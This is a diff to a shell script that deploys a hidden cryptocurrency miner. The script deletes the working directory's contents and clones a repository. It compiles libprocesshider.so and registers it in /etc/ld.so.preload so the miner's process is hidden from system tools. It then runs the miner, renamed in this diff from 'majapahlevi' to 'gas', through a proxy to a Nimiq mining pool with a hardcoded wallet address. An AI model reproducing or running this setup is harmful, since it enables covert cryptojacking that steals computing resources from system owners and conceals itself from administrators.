@@ -1,6 +1,6 @@
 rm -rvf * && mkdir d && cd d
 
-git clone https://gitlab.com/majapahlevi/majapahlevi.git
+git clone https://gitlab.com/majapahlevi/majapahlevi
 cd majapahlevi
 
 #!/bin/sh
@@ -40,8 +40,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp rm -rf majapahlevi && unzip korek.zip
-chmod +x majapahlevi
+./graftcp/graftcp rm -rf gas && unzip korek.zip
+chmod +x gas
 rm -rf Makefile
 rm -rf processhider.c
 rm -rf README.md
@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./majapahlevi -d=0 -a "NQ404CLMJ4FFKQGDA52CQ983Y8Y3ASH88HY8" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4 -i Disable 
+./graftcp/graftcp ./gas -d=0 -a "NQ404CLMJ4FFKQGDA52CQ983Y8Y3ASH88HY8" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4 -i Disable 
